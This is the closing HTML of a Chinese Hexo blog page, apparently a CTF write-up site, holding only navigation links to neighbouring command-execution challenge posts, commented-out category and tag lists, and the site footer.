                            <div class="fleet-content-body-footer-left">
                                
                                    <div><a href="/posts/e63f4b1d/"
                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
                                            </svg>
                                            <div class="flex flex-col items-start"><span
                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
                                                <span>web118-web122+web124命令执行篇（四）</span></div>
                                        </a></div>
                                
                            </div>
                            <div class="fleet-content-body-footer-right">
                                
                                    <div><a href="/posts/979871d9/"
                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                            <div class="flex flex-col items-end"><span
                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
                                                <span>web42-57命令执行篇（二）</span></div>
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                            </svg>
                                        </a></div>

                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

    <!--    嵌套位置结束-->
    <!--<h3>categories</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/">-->
    <!--                CTF-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/JavaSec/">-->
    <!--                JavaSec-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Python/">-->
    <!--                Python-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Lupas/">-->
    <!--                Lupas-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->

    <!--<h3>tags</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-->
    <!--                Java反序列化-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CC%E9%93%BE/">-->
    <!--                CC链-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/WriteUp/">-->
    <!--                WriteUp-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CISCN/">-->
    <!--                CISCN-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CTFshow0-1/">-->
    <!--                CTFshow0-1-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
    <!--                脚本-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Tampermonkey/">-->
    <!--                Tampermonkey-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Shortcut/">-->
    <!--                Shortcut-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
    <!--                语雀-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Hexo/">-->
    <!--                Hexo-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Lupas/">-->
    <!--                Lupas-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Hexo%E4%B8%BB%E9%A2%98/">-->
    <!--                Hexo主题-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->
</div>
<!--返回顶部按钮-->
<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
<!--加个渐变，但还是有点丑-->
<!-- TODO 换个更好的方案-->
<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
</div>

<footer class="footer p-10 bg-neutral text-neutral-content">
    <aside>
        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
        © 2020-2024 Lupas by Natro92
        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
    </aside>
    <nav>
        <header class="footer-title">Social</header>
        <!--<div class="grid grid-flow-col gap-4">-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
        <!--</div>-->
    </nav>
</footer>
</body>

</html>


